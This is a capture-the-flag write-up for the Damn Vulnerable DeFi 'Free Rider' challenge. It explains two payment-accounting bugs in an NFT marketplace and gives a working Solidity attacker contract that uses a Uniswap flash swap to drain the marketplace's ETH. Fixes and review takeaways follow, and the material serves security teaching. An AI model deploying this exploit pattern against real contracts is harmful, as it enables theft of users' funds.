# Free Rider - One Payment, Six NFTs, and the Seller Is You

**Challenge:** Damn Vulnerable DeFi v4 - Free Rider
**Category:** Business Logic / Payment Accounting + Flash Swap for Capital
**Severity:** Critical (the marketplace pays its entire ETH balance to the buyer)

## What's going on

An NFT marketplace lists 6 NFTs at 15 ETH each and holds 90 ETH. A separate recovery
manager will pay a 45 ETH bounty to whoever delivers all 6 NFTs to it. The player starts
with 0.1 ETH. The goal is to buy the NFTs, hand them to the recovery manager, collect
the bounty, and leave the marketplace with less ETH than it started with.

A Uniswap V2 pair with a large WETH reserve is available, which solves the lack of
starting capital through a flash swap.

## The bugs

`_buyOne` contains two independent mistakes.

**1. The payment check is not cumulative.** `buyMany` loops over the token ids, and each
iteration compares the *whole* `msg.value` against that one NFT's price:

```solidity
if (msg.value < priceToPay) revert InsufficientPayment();
```

Sending 15 ETH passes that check six times. A buyer only has to cover the most
expensive single item, not the total.

**2. The seller is looked up after the NFT has already moved.**

```solidity
_token.safeTransferFrom(_token.ownerOf(tokenId), msg.sender, tokenId);
payable(_token.ownerOf(tokenId)).sendValue(priceToPay);
```

After the transfer, `ownerOf(tokenId)` is the **buyer**. The marketplace pays the sale
price to the buyer instead of the seller. Each NFT therefore costs the buyer nothing,
and it pays the buyer 15 ETH out of the marketplace's own balance. Six NFTs return 90 ETH
for a 15 ETH payment.

## The attack

1. Deploy an attacker contract that implements `uniswapV2Call` and `onERC721Received`
   (the latter is needed because `_buyOne` uses `safeTransferFrom` to the buyer).
2. Flash-swap 15 WETH from the Uniswap V2 pair by calling `pair.swap` with non-empty
   data, and unwrap it to ETH.
3. Call `marketplace.buyMany{value: 15 ether}` for all six ids. The marketplace pays the
   attacker 90 ETH in total.
4. Repay the flash swap: the borrowed 15 WETH plus the 0.3% fee.
5. Send the six NFTs to the recovery manager with `abi.encode(player)` as data. On the
   sixth, it pays the 45 ETH bounty to that address. (The manager also requires
   `tx.origin` to be the beneficiary, which holds since the player starts the call.)
6. Forward the remaining ETH to the player.

## PoC

```solidity
function test_freeRider() public checkSolvedByPlayer {
    FreeRiderAttacker attacker =
        new FreeRiderAttacker(uniswapPair, marketplace, weth, nft, address(recoveryManager));
    attacker.attack();
}

contract FreeRiderAttacker is IERC721Receiver {
    function attack() external {
        pair.swap(NFT_PRICE, 0, address(this), hex"00");   // non-empty data = flash swap
    }

    function uniswapV2Call(address, uint256 amount0, uint256, bytes calldata) external {
        weth.withdraw(amount0);

        uint256[] memory ids = new uint256[](AMOUNT_OF_NFTS);
        for (uint256 i = 0; i < AMOUNT_OF_NFTS; i++) ids[i] = i;
        marketplace.buyMany{value: NFT_PRICE}(ids);

        uint256 repay = amount0 + (amount0 * 3) / 997 + 1;
        weth.deposit{value: repay}();
        weth.transfer(address(pair), repay);

        for (uint256 i = 0; i < AMOUNT_OF_NFTS; i++) {
            nft.safeTransferFrom(address(this), recoveryManager, i, abi.encode(owner));
        }

        (bool ok,) = owner.call{value: address(this).balance}("");
        require(ok, "forward failed");
    }

    function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}
```

Full test file: `test/free-rider/FreeRider.t.sol`

## Why I'm calling this Critical

- **The marketplace's whole ETH balance is paid out.** Every sale sends money to the buyer
  instead of the seller, so the sellers receive nothing and the marketplace loses all of it.
- **Almost no capital.** A flash swap covers the 15 ETH, and the fee is a tiny fraction
  of the proceeds.
- **No privileges and no waiting.** Any address can do it in a single transaction.
- **Two bugs compound.** The non-cumulative check makes the exploit cheap, and the
  post-transfer lookup makes it profitable.

## Fix

- **Read the seller before the transfer and pay that address:**
```solidity
  address seller = _token.ownerOf(tokenId);
  _token.safeTransferFrom(seller, msg.sender, tokenId);
  payable(seller).sendValue(priceToPay);
```
- **Track the total owed.** In a batch purchase, sum the prices and compare the total to
  `msg.value` once, or deduct each price from a running balance.
- Consider pull payments for sellers, so a failing recipient cannot affect the sale and
  the payout logic stays out of the transfer path.
- Clear the offer entry when an item is sold so state matches the transfer.

## Takeaway

Two patterns to check in any marketplace. First, a loop that reads `msg.value` inside it:
ask whether `msg.value` is being treated as a per-item budget when it is shared across the
whole batch. Second, any state variable read both before and after an external call or
transfer: confirm both reads are meant to see the updated value. Flash swaps also mean the
attacker's starting balance is rarely a limit, so check what a zero-capital attacker can do.
